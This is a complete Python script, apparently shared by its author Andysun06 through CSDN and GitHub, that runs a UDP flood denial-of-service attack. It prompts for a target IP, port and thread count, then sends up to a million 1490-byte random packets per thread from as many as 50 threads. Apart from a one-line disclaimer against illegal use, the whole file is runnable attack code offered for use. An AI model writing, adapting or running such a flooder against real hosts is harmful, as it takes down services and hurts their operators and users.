import sys
import os
import socket
import random
from datetime import datetime
from threading import Thread

# 初始化参数
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# 创建socket池
def create_socket():
    return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1490)
sockets = [create_socket() for _ in range(10)]  # 创建10个socket提高并发

os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   作者          : Andysun06                       |")
print ("|   作者github    : https://github.com/Andysun06    |")
print ("|   kali-QQ学习群 : 909533854                       |")
print ("|   版本          : V1.1.0                          |")
print ("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
print ("\---------------------------------------------------/")
print (" ")
print (" -----------------[请勿用于违法用途]----------------- ")
print (" ")

ip = input("请输入 IP     : ")
port = int(input("攻击端口      : "))
threads = int(input("线程数(1~50) : "))

os.system("clear")

# 发送函数
def attack(ip, port, socket_idx):
    sock = sockets[socket_idx % len(sockets)]
    sent = 0
    max_packets = 1000000  # 设置最大发送次数
    while sent < max_packets:
        try:
            sock.sendto(bytes, (ip, port))
            sent += 1
            if sent % 1000 == 0:  # 每1000次打印一次
                print(f"线程 {socket_idx}: 已发送 {sent} 个数据包到 {ip} 端口 {port}")
        except Exception as e:
            print(f"线程 {socket_idx} 错误: {e}")
            break
    print(f"线程 {socket_idx} 已完成: 总共发送 {sent} 个数据包")

# 启动多线程
thread_list = []
for i in range(min(threads, 50)):  # 限制最大线程数为50
    t = Thread(target=attack, args=(ip, port, i))
    t.daemon = True
    thread_list.append(t)
    t.start()

print(f"已启动 {len(thread_list)} 个线程进行攻击，每线程最多发送1000000个数据包")

# 等待所有线程完成
try:
    for t in thread_list:
        t.join()
    print("\n所有线程已完成攻击")
except KeyboardInterrupt:
    print("\n攻击被手动终止")

# 清理资源
for sock in sockets:
    sock.close()
print("已关闭所有socket连接")
